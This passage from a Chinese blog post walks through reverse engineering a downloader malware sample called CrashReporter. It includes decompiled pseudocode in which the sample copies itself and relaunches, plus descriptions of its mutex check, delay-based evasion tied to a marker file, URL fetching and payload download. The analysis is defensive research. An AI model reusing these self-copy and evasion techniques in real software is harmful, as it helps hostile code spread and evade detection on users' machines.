获取当前运行时的路径</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ( lstrcmpA_0(&amp;_crashReportPath, &amp;_currentPath) )<span class=\"comment\">// 比较两个文件运行的路径</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// 这里是路径不相同时的处理</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (CopyFileA(&amp;currentPath, &amp;CrashReportPath, <span class=\"number\">0</span>) )<span class=\"comment\">// 将自身拷贝到目标路径</span></span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> ( PathFileExistsA(&amp;CrashReportPath) )</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\twsprintf(&amp;v226, &amp;v395, &amp;CrashReportPath);</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//运行拷贝后的程序</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> ( CreateProcessA(<span class=\"number\">0</span>, &amp;v226, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, &amp;lpStartupInfo, &amp;lpProcessInformation) )<span class=\"comment\">// shellCmd</span></span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tCloseHandle_0(lpProcessInformation);</span><br><span class=\"line\">\t\t\t\t\tCloseHandle_0(v10);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tCrashReportMain((<span class=\"type\">int</span>)dataTable, a2, ExistFlag);<span class=\"comment\">// CrashReport.exe 执行的函数</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后本层函数也执行完毕。现在就开始分析重中之中，<strong>CrashReportMain</strong>。</p>\n<h2 id=\"3-CrashReportMain分析\"><a href=\"#3-CrashReportMain分析\" class=\"headerlink\" title=\"[3]CrashReportMain分析\"></a>[3]CrashReportMain分析</h2><p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId34.png\" alt=\"document_image_rId34\"></p>\n<p>首先在x32dbg进行头部下断，查看一下该函数的参数。</p>\n<p>参数1 &#x3D; dataTable</p>\n<p>参数2 &#x3D; 1</p>\n<p>参数3 &#x3D; 0</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId35.png\" alt=\"document_image_rId35\"></p>\n<p>函数进来后依旧是<strong>popMsgBox_DnsCache</strong>函数的调用，这个函数基本上不影响样本功能，所以略过。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId36.png\" alt=\"document_image_rId36\"></p>\n<p>到了这里虽然里面有一个<strong>sub_511EB0</strong>函数，但是这个条件没有成立，<strong>0x24的位置始终为0</strong>。这里先继续往下走</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId37.png\" alt=\"document_image_rId37\"></p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId38.png\" alt=\"document_image_rId38\"></p>\n<p>这里的话是判断互斥体名称是否存在，存在的话创建一个互斥体。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId39.png\" alt=\"document_image_rId39\"></p>\n<p>往下继续分析，会看到这里会对上面的错误码进行判断，而且判断的文本为<strong>Error : A downloader instance is already</strong>，由此可知，这个当前分析的这个CrashReporter样本可能是一个下载器。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId40.png\" alt=\"document_image_rId40\"></p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId41.png\" alt=\"document_image_rId41\"></p>\n<p>往下执行会执行到这个条件，因为这个<strong>sub_4C7B40</strong>内部存在<strong>sleep</strong>函数，单步跳过时会直接卡住。如果返回为true，则会执行下面的<strong>sub_5176C0</strong>，然后本层函数直接结束掉。这里就直接从<strong>sub_4C7B40</strong>开始分析。</p>\n<h2 id=\"4-sub-4C7B40分析\"><a href=\"#4-sub-4C7B40分析\" class=\"headerlink\" title=\"[4]sub_4C7B40分析\"></a>[4]sub_4C7B40分析</h2><p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId42.png\" alt=\"document_image_rId42\"></p>\n<p>首先执行第一个函数，<strong>CheckMachineIsMatch_FileExist</strong>，这个函数会检测是否存在文件<strong>C:\\ProgramData\\WeiXinCR02文件</strong>，该文件存放着C盘序列号的CRC32值。如果文件不存在则函数返回0，如果存在则获取C盘的序列号并且计算出CRC32值，然后与文件里的值对比，是否一致。这里由于文件是不存在的，所以返回的为0，下面0x40是1，条件成立直接执行下面的延迟函数。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId43.png\" alt=\"document_image_rId43\"></p>\n<p><strong>safeSleep</strong>通过isMatch来计算需要延迟的时间，如果isMatch &#x3D;&#x3D; true，则延迟2分钟，反之延迟4分钟。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId44.png\" alt=\"document_image_rId44\"></p>\n<p>这里因为为了分析直接先nop掉这个函数执行，并且让返回值为1。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId45.png\" alt=\"document_image_rId45\"></p>\n<p>包括这里isMatch也是0，所以这里也需要改。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId46.png\" alt=\"document_image_rId46\"></p>\n<p>紧接着执行这个位置，函数直接返回1。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId47.png\" alt=\"document_image_rId47\"></p>\n<p>由于没有文件WeiXinCR02，所有在函数尾部，创建了该文件，并写入了C盘序列号的CRC32值，最后也返回1。这个函数整体大概是通过判断文件WeiXinCR02的存在来进行样本休眠，具体的作用可能为了躲过某些检测。</p>\n<h2 id=\"5-sub-5176C0分析\"><a href=\"#5-sub-5176C0分析\" class=\"headerlink\" title=\"[5]sub_5176C0分析\"></a>[5]sub_5176C0分析</h2><p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId48.png\" alt=\"document_image_rId48\"></p>\n<p>进入头部直接是一个urlList的初始化</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId49.png\" alt=\"document_image_rId49\"></p>\n<p>往下走会执行一个<strong>Requst</strong>函数，会对每一个url进行一个get请求和读取源码，之后会执行一个<strong>sub_5071A0</strong>，这里没分析出具体是干嘛。看到一些加密或解密的函数，估计是在读取网页源码的时候对内容进行解密然后形成shellcode?</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId50.png\" alt=\"document_image_rId50\"></p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId51.png\" alt=\"document_image_rId51\"></p>\n<p>网页操作执行完后，就是文件下载了，这里通过查看数据表发现这里的字符串都是以<strong>url\\filename</strong>的形式存在，然后下面只有一个函数在执行，所以这里基本上可以确定下面的函数是下载这些文件，在这里本人自己去访问一下这些地址，发现已经无法访问了，所以无法下载，这估计也是为什么该样本运行时只有一个信息框弹出，就没有其它反应了，这里进入<strong>downloader</strong>进行分析。</p>\n<h2 id=\"6-downloader分析\"><a href=\"#6-downloader分析\" class=\"headerlink\" title=\"[6]downloader分析\"></a>[6]downloader分析</h2><p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId52.png\" alt=\"document_image_rId52\"></p>\n<p>函数头的字符串提示更加确定这是一个下载函数。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId53.png\" alt=\"document_image_rId53\"></p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId54.png\" alt=\"document_image_rId54\"></p>\n<p>往下走后会看到样本使用了<strong>strtok</strong>进行文本分割，然后传入<strong>startDownLoad</strong>开始下载，下载同时会记录下载的个数，当所有下载完成后，本层函数返回下载的总数。这里注意下上面<strong>CrashReporter</strong>函数中我少了一个函数没分析，那个函数其实就是这个函数。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId55.png\" alt=\"document_image_rId55\"></p>\n<h2 id=\"7-startDownLoad分析\"><a href=\"#7-startDownLoad分析\" class=\"headerlink\" title=\"[7]startDownLoad分析\"></a>[7]startDownLoad分析</h2><p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId56.png\" alt=\"document_image_rId56\"></p>\n<p>这里定义了一个结构体变量，newMem_8,结构体内容如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">unkown</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span>* urlField;</span><br><span class=\"line\">\t<span class=\"type\">int</span>* dataTable</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>之后会根据参数3进行启动不同的下载线程。</p>\n<h2 id=\"8-sub-50C610分析\"><a href=\"#8-sub-50C610分析\" class=\"headerlink\" title=\"[8]sub_50C610分析\"></a>[8]sub_50C610分析</h2><p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId57.png\" alt=\"document_image_rId57\"></p>\n<p>因为文件已经无法下载了，所以<strong>sub_5071A0</strong>本人没法继续跟入分析，因为此函数里，基本都是对下载的文件进行<strong>image,section</strong>校验，且对部分数据进行处理。由于没拿到原文件，所以本人无从下手。</p>\n<h2 id=\"9-openDoc-download分析\"><a href=\"#9-openDoc-download分析\" class=\"headerlink\" title=\"[9]openDoc_download分析\"></a>[9]openDoc_download分析</h2><p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId58.png\" alt=\"document_image_rId58\"></p>\n<p>首先是是对保存路径初始化。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId59.png\" alt=\"document_image_rId59\"></p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId60.png\" alt=\"document_image_rId60\"></p>\n<p>然后是对文件路径判断是否存在，如果存在则打开改文档。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId61.png\" alt=\"document_image_rId61\"></p>\n<p>否则进行下载。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId62.png\" alt=\"document_image_rId62\"></p>\n<p>下载完成后创建路径，然后再去打开文档。同样，由于文档当前也是无法下载的，导致没法进一步分析。</p>\n<p>至此，该样本分析基本完了，且据目前分析结果来看，该样本也就是个下载器。</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>长达一周的分析，终于结束了。因为该样本添加了很多的垃圾代码，导致分析的时候需要翻来翻去，有些关键代码又夹在里面，分析的时候甚是头疼，并且还有很多没用的条件，看起来觉得他会执行，但是动态调试的时候就是不会执行，就很蛋疼。又因为该样本的下载文件地址全部失效，把样本跑起来后整个虚拟机啥问题都没有，监视工具也压根就没啥反应，压根就是一个正常的程序，这更增加了分析难度。刚刚开始接手这个样本时，运行起来和正常程序没什么区别，完全没有找到有关恶意代码的地方，最后被迫无奈，直接从WinMain手撕。整个样本，共106个函数，天天24小时肝。由于压根就没看到有什么恶意代码，使得产生自我怀疑，甚至产生了放弃的念头，但是想到已经分析那么多了，还不如坚持下去。最后把70多个函数全部给分析了，然后已经看出了个大概，其余的就没分析，只看了个流程。</p>\n","categories":["Virus"]}]